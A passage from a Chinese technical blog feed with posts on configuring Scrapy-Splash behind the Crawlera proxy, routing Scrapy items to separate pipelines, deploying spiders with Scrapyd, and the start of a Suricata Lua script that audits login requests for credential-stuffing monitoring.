<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">DOWNLOADER_MIDDLEWARES = &#123;</span><br><span class="line">    <span class="string">&#x27;scrapy_splash.SplashCookiesMiddleware&#x27;</span>: 723,</span><br><span class="line">    <span class="string">&#x27;scrapy_splash.SplashMiddleware&#x27;</span>: 725,</span><br><span class="line">    <span class="string">&#x27;scrapy.downloadermiddlewares.httpcompression.HttpCompressionMiddleware&#x27;</span>: 810,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><em>Order 723 is just before HttpProxyMiddleware (750) in default scrapy settings.</em></p>
<p><strong>3.3    启用SplashDeduplicateArgsMiddleware</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SPIDER_MIDDLEWARES = &#123;</span><br><span class="line">    <span class="string">&#x27;scrapy_splash.SplashDeduplicateArgsMiddleware&#x27;</span>: 100,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>3.4  自定义 DUPEFILTER_CLASS</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">DUPEFILTER_CLASS = <span class="string">&#x27;scrapy_splash.SplashAwareDupeFilter&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>3.5 使用Scrapy HTTP缓存</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HTTPCACHE_STORAGE = <span class="string">&#x27;scrapy_splash.SplashAwareFSCacheStorage&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="4-代码"><a href="#4-代码" class="headerlink" title="4. 代码"></a>4. 代码</h2><p>注:  当使用<strong>Scrapy-Splash</strong>之后, 将无法直接使用<strong>crawlera middleware</strong>。需要手动引用外部lua脚本。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> haveibeenpwned.items <span class="keyword">import</span> feed</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> scrapy_splash <span class="keyword">import</span> SplashRequest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">from redis crawl haveibeenpwned</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">LUA_SOURCE = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    function main(splash)</span></span><br><span class="line"><span class="string">        local host = &quot;proxy.crawlera.com&quot;</span></span><br><span class="line"><span class="string">        local port = 8010</span></span><br><span class="line"><span class="string">        local user = &quot;api_key&quot;</span></span><br><span class="line"><span class="string">        local password = &quot;&quot;</span></span><br><span class="line"><span class="string">        local session_header = &quot;X-Crawlera-Session&quot;</span></span><br><span class="line"><span class="string">        local session_id = &quot;create&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        splash:on_request(function (request)</span></span><br><span class="line"><span class="string">            request:set_header(&quot;X-Crawlera-UA&quot;, &quot;desktop&quot;)</span></span><br><span class="line"><span class="string">            request:set_header(session_header, session_id)</span></span><br><span class="line"><span class="string">            request:set_proxy&#123;host, port, username=user, password=password&#125;</span></span><br><span class="line"><span class="string">        end)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        splash:on_response_headers(function (response)</span></span><br><span class="line"><span class="string">            if response.headers[session_header] ~= nil then</span></span><br><span class="line"><span class="string">                session_id = response.headers[session_header]</span></span><br><span class="line"><span class="string">            end</span></span><br><span class="line"><span class="string">        end)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        splash:go(splash.args.url)</span></span><br><span class="line"><span class="string">        return splash:html()</span></span><br><span class="line"><span class="string">    end</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CheckSpider</span>(<span class="params">scrapy.Spider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;scrapy_demo&#x27;</span></span><br><span class="line">    start_urls = <span class="string">&#x27;https://httpbin.org/get&#x27;</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start_requests</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">yield</span> SplashRequest(self.start_urls, self.parse, endpoint=<span class="string">&#x27;execute&#x27;</span>,  args=&#123;<span class="string">&#x27;wait&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;lua_source&#x27;</span>: LUA_SOURCE&#125;)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<p>参考:</p>
<ul>
<li><a href="https://github.com/scrapy-plugins/scrapy-splash/issues/117">https://github.com/scrapy-plugins/scrapy-splash/issues/117</a></li>
</ul>
<p>参考:</p>
<ul>
<li><a href="https://splash.readthedocs.io/en/stable/search.html?q=splash:html&check_keywords=yes&area=default">Splash</a></li>
<li><a href="https://github.com/scrapy-plugins/scrapy-splash">Scrapy-Splash</a></li>
<li><a href="https://doc.scrapinghub.com/crawlera.html#using-crawlera-with-splash">Scrapinghub API Reference</a></li>
<li><a href="https://stackoverflow.com/questions/43646438/using-proxy-with-scrapy-splash">using proxy with scrapy-splash</a></li>
<li><a href="http://stackoverflow.com/questions/43090352/proxy-servers-with-scrapy-splash"><strong>Proxy servers with Scrapy-Splash</strong></a></li>
<li><a href="https://github.com/scrapy-plugins/scrapy-splash/issues/97">Crawlera integration</a></li>
<li><a href="https://blog.csdn.net/zhengxiangwen/article/details/55227368"><strong>利用scrapy-splash爬取JS生成的动态页面</strong></a></li>
</ul>
]]></content>
      <categories>
        <category>Spider</category>
      </categories>
      <tags>
        <tag>Scrapy</tag>
      </tags>
  </entry>
  <entry>
    <title>Scrapy 多个item对应一个pipeline</title>
    <url>/2019/12/30/Scrapy-%E5%A4%9A%E4%B8%AAitem%E5%AF%B9%E5%BA%94%E4%B8%80%E4%B8%AApipeline/</url>
    <content><![CDATA[<h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>​        在利用<strong>Scrapy</strong>编写爬虫时,经常会遇到同一个爬虫中包含多个item classes, 并且需要在同一个<code>pipelines.py</code>中根据不同的item classes进行逻辑的处理。</p>
<p>​        <strong>需求:</strong> 数据需要同时发送到ElasticSearch以及Redis, 唯一的区别就是item classes,不同。发送到Redis的数据是标准化之后的数据, 发送到ElasticSearch是原始的数据。</p>
<p>​        <strong>解决方法:</strong> 这里可以通过<code>isinstance</code>来进行区分。</p>
<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define your item pipelines here</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Don&#x27;t forget to add your pipeline to the ITEM_PIPELINES setting</span></span><br><span class="line"><span class="comment"># See: https://doc.scrapy.org/en/latest/topics/item-pipeline.html</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tb.items <span class="keyword">import</span> RedisItem</span><br><span class="line"><span class="keyword">from</span> tb.items <span class="keyword">import</span> ElasticSearchItem</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RedisPipeline</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(item, RedisItem):</span><br><span class="line">            <span class="comment"># to do something</span></span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ElasticPipeline</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(item, ElasticSearchItem):</span><br><span class="line">            <span class="comment"># to do something</span></span><br><span class="line">        <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure>

<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul>
<li><strong><a href="https://stackoverflow.com/questions/32743469/scrapy-python-multiple-item-classes-in-one-pipeline">Scrapy, Python: Multiple Item Classes in one pipeline?</a></strong></li>
<li><strong><a href="https://blog.csdn.net/sinat_32651363/article/details/79092431">Scrapy同一个爬虫里包含不同item，pipelines文件编写</a></strong></li>
</ul>
]]></content>
      <categories>
        <category>Spider</category>
      </categories>
      <tags>
        <tag>Scrapy</tag>
      </tags>
  </entry>
  <entry>
    <title>Scrapyd + Scrapyd-Client</title>
    <url>/2019/12/19/Scrapyd%20+%20Scrapyd-Client/</url>
    <content><![CDATA[<h1 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h1><p>​        由于网站时常遭受黑客攻击, 现准备将手头一些攻击者的IP地址收集起来用做企业内部的威胁情报。既然要着手做威胁情报, 那么就避免不了通过一些网站进行数据的丰富化。要想简单省事儿, 当然是使用购买api账号的方式,不过有的api也很坑, 除非购买的是企业版, 否则个人版的api会受到请求速率的限制。所以这边只能依靠爬虫(<strong>Scrapy</strong>)来收集数据。但是采用了分布式爬虫, 就避免不了需要进行集中管理, 以及统一下等操作。下面就说下利用<strong>Scrapy</strong>官方提供的爬虫管理工具(<strong>Scrapyd</strong>)来满足以上的需求。</p>
<h1 id="Scrapyd"><a href="#Scrapyd" class="headerlink" title="Scrapyd"></a>Scrapyd</h1><p>​        <strong>Scrapyd</strong>是由<strong>Scrapy</strong> 官方提供的爬虫管理工具，使用它我们可以非常方便地上传、控制爬虫并且查看运行日志。</p>
<p><strong>安装</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pip install scrapyd</span><br></pre></td></tr></table></figure>

<p><strong>启动</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ scrapyd</span><br><span class="line">2019-12-19T10:56:06+0800 [-] Loading /Users/canon/anaconda3/lib/python3.7/site-packages/scrapyd/txapp.py...</span><br><span class="line">2019-12-19T10:56:06+0800 [-] Scrapyd web console available at http://127.0.0.1:6800/</span><br><span class="line">2019-12-19T10:56:06+0800 [-] Loaded.</span><br><span class="line">2019-12-19T10:56:06+0800 [twisted.scripts._twistd_unix.UnixAppLogger<span class="comment">#info] twistd 18.9.0 (/Users/canon/anaconda3/bin/python 3.7.1) starting up.</span></span><br><span class="line">2019-12-19T10:56:06+0800 [twisted.scripts._twistd_unix.UnixAppLogger<span class="comment">#info] reactor class: twisted.internet.selectreactor.SelectReactor.</span></span><br><span class="line">2019-12-19T10:56:06+0800 [-] Site starting on 6800</span><br><span class="line">2019-12-19T10:56:06+0800 [twisted.web.server.Site<span class="comment">#info] Starting factory &lt;twisted.web.server.Site object at 0x109efcf98&gt;</span></span><br><span class="line">2019-12-19T10:56:06+0800 [Launcher] Scrapyd 1.2.1 started: max_proc=48, runner=<span class="string">&#x27;scrapyd.runner&#x27;</span></span><br></pre></td></tr></table></figure>

<p>​        <strong>Scrapyd</strong>是一个服务端，我们需要通过一个客户端(<strong>Scrapyd-Client</strong>)将爬虫项目发送到<strong>Scrapyd</strong>服务中去。这里先修改一下<strong>Scrapyd</strong>服务地址，默认<strong>Scrapyd</strong>启动是通过命令: <code>Scrapyd</code>就可以直接启动，默认绑定的ip地址是<em>127.0.0.1</em>端口是:<em>6800</em>，这里为了其他主机可以访问，需将ip地址设置为<em>0.0.0.0</em>。</p>
<p>​         根据上图启动的信息, 可以看到默认配置文件是在<code>/Users/canon/anaconda3/lib/python3.7/site-packages/scrapyd/</code>中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ vim default_scrapyd.conf</span><br><span class="line"></span><br><span class="line">[scrapyd]</span><br><span class="line">eggs_dir    = eggs</span><br><span class="line">logs_dir    = logs</span><br><span class="line">items_dir   =</span><br><span class="line">jobs_to_keep = 5</span><br><span class="line">dbs_dir     = dbs</span><br><span class="line">max_proc    = 0</span><br><span class="line">max_proc_per_cpu = 4</span><br><span class="line">finished_to_keep = 100</span><br><span class="line">poll_interval = 5.0</span><br><span class="line">bind_address = 0.0.0.0</span><br><span class="line">http_port   = 6800</span><br><span class="line">debug       = off</span><br><span class="line">runner      = scrapyd.runner</span><br><span class="line">application = scrapyd.app.application</span><br><span class="line">launcher    = scrapyd.launcher.Launcher</span><br><span class="line">webroot     = scrapyd.website.Root</span><br><span class="line"></span><br><span class="line">[services]</span><br><span class="line">schedule.json     = scrapyd.webservice.Schedule</span><br><span class="line">cancel.json       = scrapyd.webservice.Cancel</span><br><span class="line">addversion.json   = scrapyd.webservice.AddVersion</span><br><span class="line">listprojects.json = scrapyd.webservice.ListProjects</span><br><span class="line">listversions.json = scrapyd.webservice.ListVersions</span><br><span class="line">listspiders.json  = scrapyd.webservice.ListSpiders</span><br><span class="line">delproject.json   = scrapyd.webservice.DeleteProject</span><br><span class="line">delversion.json   = scrapyd.webservice.DeleteVersion</span><br><span class="line">listjobs.json     = scrapyd.webservice.ListJobs</span><br><span class="line">daemonstatus.json = scrapyd.webservice.DaemonStatus</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Scrapyd-Client"><a href="#Scrapyd-Client" class="headerlink" title="Scrapyd-Client"></a>Scrapyd-Client</h1><p>​        <strong>Scrapyd-Client</strong>可以用来部署<strong>Scrapy</strong>项目，它会帮我们把项目打包成<strong>egg</strong>文件，我们不用再动手调用<code>add version.json</code>接口去部署到<strong>Scrapyd</strong>，操作简单。</p>
<p><strong>安装</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pip install scrapyd-client</span><br></pre></td></tr></table></figure>

<p><strong>配置</strong></p>
<p>​        要部署<strong>Scrapy</strong>项目，我们首先需要修改项目的配置文件。首先切换至项目根目录, 会看到有一个<code>scrapy.cfg</code>文件，它的内容如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Automatically created by: scrapy startproject</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># For more information about the [deploy] section see:</span></span><br><span class="line"><span class="comment"># https://scrapyd.readthedocs.io/en/latest/deploy.html</span></span><br><span class="line"></span><br><span class="line">[settings]</span><br><span class="line">default = spider_ti.settings</span><br><span class="line"></span><br><span class="line">[deploy]</span><br><span class="line"><span class="comment">#url = http://localhost:6800/</span></span><br><span class="line">project = spider_ti</span><br></pre></td></tr></table></figure>

<p>这里需要配置一下<code>deploy</code>部分。例如, 我们将项目部署到<em>10.10.10.1</em>的<strong>Scrapyd</strong>上，则修改内容如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[deploy]</span><br><span class="line">url = http://10.10.10.1:6800/</span><br><span class="line">project = spider_ti</span><br></pre></td></tr></table></figure>

<p>这样我们再在<code>scrapy.cf</code>g文件所在路径执行如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ scrapyd-deploy</span><br><span class="line"></span><br><span class="line">Packing version 1576725163</span><br><span class="line">Deploying to project <span class="string">&quot;spider_ti&quot;</span> <span class="keyword">in</span> http://localhost:6800/addversion.json</span><br><span class="line">Server response (200):</span><br><span class="line">&#123;<span class="string">&quot;node_name&quot;</span>: <span class="string">&quot;CanondeMacBook-Pro.local&quot;</span>, <span class="string">&quot;status&quot;</span>: <span class="string">&quot;ok&quot;</span>, <span class="string">&quot;project&quot;</span>: <span class="string">&quot;spider_ti&quot;</span>, <span class="string">&quot;version&quot;</span>: <span class="string">&quot;1576725163&quot;</span>, <span class="string">&quot;spiders&quot;</span>: 3&#125;</span><br></pre></td></tr></table></figure>

<p>项目版本默认为当前时间戳。我们也可以指定项目版本，通过<code>version</code>参数传递即可。例如:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ scrapyd-deploy --version 201912191114</span><br></pre></td></tr></table></figure>

<p>注: 在Python3的Scrapyd 1.2.0版本中，<strong>版本号不能指定为带字母的字符串，它们必须为纯数字</strong>，否则会出现报错。</p>
<p>如果有多台主机，我们可以配置各台主机的别名，修改配置文件为:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[deploy:vm1]</span><br><span class="line">url = http://10.10.10.1:6800/</span><br><span class="line">project = spider_ti</span><br><span class="line"></span><br><span class="line">[deploy:vm2]</span><br><span class="line">url = http://10.10.10.2:6800/</span><br><span class="line">project = spider_ti</span><br></pre></td></tr></table></figure>

<p>在此统一配置多台主机，一台主机对应一组配置，在<code>deploy</code>后面加上主机的别名即可。如果想将项目部署到IP为<em>10.10.10.2</em>的<strong>vm2</strong>主机，我们只需要执行如下命令:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scrapyd-deploy vm2</span><br></pre></td></tr></table></figure>

<p>如此一来，我们只需要在<code>scrapy.cfg</code>文件中配置好各台主机的<strong>Scrapyd</strong>地址，然后调用<code>scrapyd-deploy</code>命令加主机名称即可实现部署。</p>
<p>如果<strong>Scrapyd</strong>设置了访问限制，我们可以在配置文件中加入用户名和密码的配置，同时修改端口成Nginx代理端口。例如: 在第1章我们使用的是6801，那么这里就需要改成6801，修改如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[deploy:vm1]</span><br><span class="line">url = http://10.10.10.1:6801/</span><br><span class="line">project = spider_ti</span><br><span class="line">username = admin</span><br><span class="line">password = admin</span><br><span class="line"></span><br><span class="line">[deploy:vm2]</span><br><span class="line">url = http://10.10.10.2:6801/</span><br><span class="line">project = spider_ti</span><br><span class="line">username = canon</span><br><span class="line">password = canon</span><br></pre></td></tr></table></figure>

<p>通过加入username和password字段，我们就可以在部署时自动进行Auth验证，然后成功实现部署。</p>
<p><strong>运行</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl http://127.0.0.1:6800/schedule.json -d project=spider_ti -d spider=ti</span><br></pre></td></tr></table></figure>

<p><strong>列出任务</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl http://127.0.0.1:6800/listjobs.json?project=spider_ti | python -m json.tool</span><br></pre></td></tr></table></figure>

<p><strong>列出项目</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl http://127.0.0.1:6800/listprojects.json</span><br></pre></td></tr></table></figure>

<p><strong>停止</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl http://127.0.0.1:6800/cancel.json -d project=spider_ti -d job=838dec26222311ea8eb6a5eb893a35a5</span><br></pre></td></tr></table></figure>

<p><strong>删除</strong></p>
<ul>
<li><em>版本</em></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl http://127.0.0.1:6800/delversion.json -d project=spider_ti -d version=1576735972</span><br></pre></td></tr></table></figure>

<ul>
<li><em>项目</em></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl http://127.0.0.1:6800/delproject.json -d project=spider_ti</span><br></pre></td></tr></table></figure>



<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://juejin.im/post/5b0f8f6f6fb9a00a2364a020"><strong>分布式爬虫的部署之Scrapyd-Client的使用</strong></a></li>
<li><a href="https://link.jianshu.com/?t=http://scrapyd.readthedocs.org/en/latest/api.html"><strong>Scrapyd</strong></a></li>
</ul>
]]></content>
      <categories>
        <category>Spider</category>
      </categories>
      <tags>
        <tag>Scrapy</tag>
      </tags>
  </entry>
  <entry>
    <title>Suricata - Lua Output Script</title>
    <url>/2019/10/14/Suricata%20-%20Lua%20Output/</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>​    由于近期网站遭受大量撞库攻击, 想监控一下登录接口中的异常行为。通过<strong>alert</strong>并不能起到很好的效果, 所以采用<strong>Lua</strong>脚本进行扩展, 写了一个审计登录接口的脚本。通过登录接口事件, 再配合<strong>Wazuh</strong>进行一些简单的关联告警,  效果还是不错的。</p>
<h1 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h1><ul>
<li>由于审计内容涉及到用户敏感信息, 因此需要对敏感信息进行<strong>Hash</strong>之后再输出;</li>
<li>除通用<strong>HTTP Header</strong>字段外支持对自定义字段进行选择性输出;</li>
</ul>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">json = <span class="built_in">require</span> <span class="string">&quot;json&quot;</span></span><br><span class="line">md5 = <span class="built_in">require</span> <span class="string">&quot;md5&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 登录接口</span></span><br><span class="line">login_url = <span class="string">&quot;/login&quot;</span></span><br><span class="line"><span class="comment">-- 登录状态码</span></span><br><span class="line">success_code = <span class="number">0</span></span><br><span class="line"><span class="comment">-- event_name</span></span><br><span class="line">event_name = <span class="string">&quot;login_audit&quot;</span></span><br><span class="line"><span class="comment">-- event_type</span></span><br><span class="line">event_type = <span class="string">&quot;lua&quot;</span></span><br><span class="line"><span class="comment">-- app_type</span></span><br><span class="line">app_type = <span class="string">&quot;web&quot;</span></span><br><span class="line"><span class="comment">-- logs</span></span><br><span class="line">name = <span class="string">&quot;web_login_audit.json&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- common_mapping</span></span><br><span class="line">http_common_mapping = <span class="string">&#x27;&#123;&quot;accept&quot;:&quot;accept&quot;,&quot;accept-charset&quot;:&quot;accept_charset&quot;,&quot;accept-encoding&quot;:&quot;accept_encoding&quot;,&quot;accept-language&quot;:&quot;accept_language&quot;,&quot;accept-datetime&quot;:&quot;accept_datetime&quot;,&quot;authorization&quot;:&quot;authorization&quot;,&quot;cache-control&quot;:&quot;cache_control&quot;,&quot;from&quot;:&quot;from&quot;,&quot;max-forwards&quot;:&quot;max_forwards&quot;,&quot;origin&quot;:&quot;origin&quot;,&quot;pragma&quot;:&quot;pragma&quot;,&quot;proxy-authorization&quot;:&quot;proxy_authorization&quot;,&quot;via&quot;:&quot;via&quot;,&quot;vary&quot;:&quot;vary&quot;,&quot;x-requested-with&quot;:&quot;x_requested_with&quot;,&quot;x-forwarded-proto&quot;:&quot;x_forwarded_proto&quot;,&quot;accept-range&quot;:&quot;accept_range&quot;,&quot;allow&quot;:&quot;allow&quot;,&quot;connection&quot;:&quot;connection&quot;,&quot;content-encoding&quot;:&quot;content_encoding&quot;,&quot;content-language&quot;:&quot;content_language&quot;,&quot;content-location&quot;:&quot;content_location&quot;,&quot;content-md5&quot;:&quot;content_md5&quot;,&quot;content-range&quot;:&quot;content_range&quot;,&quot;date&quot;:&quot;date&quot;,&quot;last-modified&quot;:&quot;last_modified&quot;,&quot;location&quot;:&quot;location&quot;,&quot;proxy-authenticate&quot;:&quot;proxy_authenticate&quot;,&quot;referrer&quot;:&quot;refer&quot;,&quot;retry-after&quot;:&quot;retry_after&quot;,&quot;server&quot;:&quot;server&quot;,&quot;transfer-encoding&quot;:&quot;transfer_encoding&quot;,&quot;upgrade&quot;:&quot;upgrade&quot;,&quot;www-authenticate&quot;:&quot;www_authenticate&quot;,&quot;x-authenticated-user&quot;:&quot;x_authenticated_user&quot;,&quot;user-agent&quot;:&quot;user_agent&quot;&#125;&#x27;</span></span><br><span class="line">common_mapping_table = json.decode(http_common_mapping)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- request_mapping</span></span><br><span class="line">http_request_mapping = <span class="string">&#x27;&#123;&quot;content-length&quot;:&quot;request_content_length&quot;,&quot;content-type&quot;:&quot;request_content_type&quot;&#125;&#x27;</span></span><br><span class="line">request_mapping_table = json.decode(http_request_mapping)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- response_mapping</span></span><br><span class="line">http_response_mapping = <span class="string">&#x27;&#123;&quot;content-length&quot;:&quot;response_content_length&quot;,&quot;content-type&quot;:&quot;response_content_type&quot;&#125;&#x27;</span></span><br><span class="line">response_mapping_table = json.decode(http_response_mapping)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- defind functioin</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">md5Encode</span><span class="params">(args)</span></span></span><br><span class="line">    m = md5.new()</span><br><span class="line">    m:update(args)</span><br><span class="line">    <span class="keyword">return</span> md5.tohex(m:finish())</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">urlDecode</span><span class="params">(args)</span></span></span><br><span class="line">    s = <span class="built_in">string</span>.<span class="built_in">gsub</span>(args, <span class="string">&quot;%%(%x%x)&quot;</span>, <span class="function"><span class="keyword">function</span><span class="params">(h)</span></span> <span class="keyword">return</span> <span class="built_in">string</span>.<span class="built_in">char</span>(<span class="built_in">tonumber</span>(h, <span class="number">16</span>)) <span class="keyword">end</span>)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- email=xxx@yyy.com&amp;password=zzz</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">formatStr</span><span class="params">(args)</span></span></span><br><span class="line">    t = &#123;&#125;</span><br><span class="line">    data = <span class="built_in">string</span>.split(args, <span class="string">&#x27;&amp;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> n, v <span class="keyword">in</span> <span class="built_in">ipairs</span>(data) <span class="keyword">do</span></span><br><span class="line">        d = <span class="built_in">string</span>.split(v, <span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">        t[d[<span class="number">1</span>]] = d[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">string.split</span><span class="params">(s, p)</span></span></span><br><span class="line">    <span class="keyword">local</span> rt = &#123;&#125;</span><br><span class="line">    <span class="built_in">string</span>.<span class="built_in">gsub</span>(s, <span class="string">&#x27;[^&#x27;</span>..p..<span class="string">&#x27;]+&#x27;</span>, <span class="function"><span class="keyword">function</span><span class="params">(w)</span></span> <span class="built_in">table</span>.<span class="built_in">insert</span>(rt, w) <span class="keyword">end</span> )</span><br><span class="line">    <span class="keyword">return</span> rt</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trim</span><span class="params">(s)</span></span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">string</span>.<span class="built_in">gsub</span>(s, <span class="string">&quot;^%s*(.-)%s*$&quot;</span>, <span class="string">&quot;%1&quot;</span>))</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">formatCookie</span><span class="params">(args)</span></span></span><br><span class="line">    t = &#123;&#125;</span><br><span class="line">    data = <span class="built_in">string</span>.split(args, <span class="string">&quot;;&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> n, v <span class="keyword">in</span> <span class="built_in">ipairs</span>(data) <span class="keyword">do</span></span><br><span class="line">        v = trim(v)</span><br><span class="line">        d = <span class="built_in">string</span>.split(v, <span class="string">&quot;=&quot;</span>)</span><br><span class="line">        t[d[<span class="number">1</span>]] = d[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- default function</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init</span> <span class="params">(args)</span></span></span><br><span class="line">    <span class="keyword">local</span> needs = &#123;&#125;</span><br><span class="line">    needs[<span class="string">&quot;protocol&quot;</span>] = <span class="string">&quot;http&quot;</span></span><br><span class="line">    <span class="keyword">return</span> needs</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setup</span> <span class="params">(args)</span></span></span><br><span class="line">    filename = SCLogPath() .. <span class="string">&quot;/&quot;</span> .. name</span><br><span class="line">    file = <span class="built_in">assert</span>(<span class="built_in">io</span>.<span class="built_in">open</span>(filename, <span class="string">&quot;a&quot;</span>))</span><br><span class="line">    SCLogInfo(<span class="string">&quot;Web Login Log Filename &quot;</span> .. filename)</span><br><span class="line">    http = <span class="number">0</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log</span><span class="params">(args)</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">-- init tables</span></span><br><span class="line">    http_table = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- http_hostname</span></span><br><span class="line">    http_hostname = HttpGetRequestHost()</span><br><span class="line">    http_table[<span class="string">&quot;hostname&quot;</span>] = http_hostname</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- http_url</span></span><br><span class="line">    http_url = HttpGetRequestUriNormalized()</span><br><span class="line">    <span class="keyword">if</span> http_url ~= login_url <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    http_table[<span 